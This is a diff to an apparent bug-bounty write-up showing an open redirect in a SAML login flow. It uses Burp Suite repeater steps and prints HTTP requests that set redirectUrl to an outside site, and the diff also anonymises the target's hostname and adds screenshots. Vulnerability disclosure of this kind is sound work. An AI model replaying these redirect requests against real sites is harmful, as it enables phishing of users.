@@ -26,7 +26,7 @@ Response
 
 I will be using google.com and facebook.com as an example of a malicious hacker website.
 
-STEP 1 : Visit atlas.instacart.com and capture the request below with burpsuite and send to the repeater.
+STEP 1 : Visit atlas.xyz.com and capture the request below with burpsuite and send to the repeater.
 ```plaintext
 GET /login HTTP/1.1
 Host: atlas.xyz.tools
@@ -60,6 +60,12 @@ send the request via the repeater , response should be
 <html><body>You are being <a href="https://facebook.com/auth/saml?redirectUrl=https://facebook.com">redirected</a>.</body></html>
 ```
 
+</br>
+<div align="center">
+  <img src="Kali_2020_x64_Customized_by_zSecurity_v1.2__Running__-_Oracle_VM_VirtualBox_25_02_2022_05_02_08.png" alt="Project Image">
+</div>
+
+
 Following the redirection.......
 ```plaintext
 GET /auth/saml?redirectUrl=https://facebook.com HTTP/1.1
@@ -90,10 +96,11 @@ Response
 ------------------snip--------------------------------------
 <a class="btn btn-primary btn-lg" role="button" id="sign_in" href="https://facebook.com/login">Sign in</a>
 ```
+</br>
 <div align="center">
   <img src="Burp_Suite_Community_Edition_v2020.12.1_-_Temporary_Project_27_02_2022_12_04_48.png" alt="Project Image">
 </div>
-
+</br>
 Request the response in browser session
 As soon as the sign in button is clicked the user is redirected to a facebook.com instead of atlas.xyz.tools/login.
 
